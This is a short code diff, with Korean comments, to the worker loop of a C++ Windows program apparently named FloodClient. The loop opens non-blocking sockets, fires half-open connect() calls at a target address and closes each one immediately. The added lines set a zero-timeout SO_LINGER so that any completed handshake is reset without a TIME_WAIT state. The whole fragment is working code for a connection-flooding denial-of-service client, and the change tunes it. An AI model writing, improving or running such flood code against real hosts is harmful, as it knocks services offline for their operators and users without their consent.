@@ -57,7 +57,12 @@ void FloodClient::workerLoop()
 		ioctlsocket(s, FIONBIO, &on);	// 논블로킹 전환 - connect()가 SYN만 보내고 즉시 반환되게 함
 
 		connect(s, reinterpret_cast<sockaddr*>(&mTargetAddr), sizeof(mTargetAddr));	// handshake 완료 여부는 확인 안 함
-		closesocket(s);	// SYN-SENT 상태에서 즉시 닫음 - ACK 없이 TCB만 삭제됨
+
+		LINGER linger{};
+		linger.l_onoff = 1;
+		linger.l_linger = 0;
+		setsockopt(s, SOL_SOCKET, SO_LINGER, reinterpret_cast<const char*>(&linger), sizeof(linger));
+		closesocket(s);	// SYN-SENT 상태에서 즉시 닫음 - 혹시 그 사이 handshake가 끝났더라도 TIME_WAIT 없이 RST로 정리
 
 		++mAttemptCount;
 	}
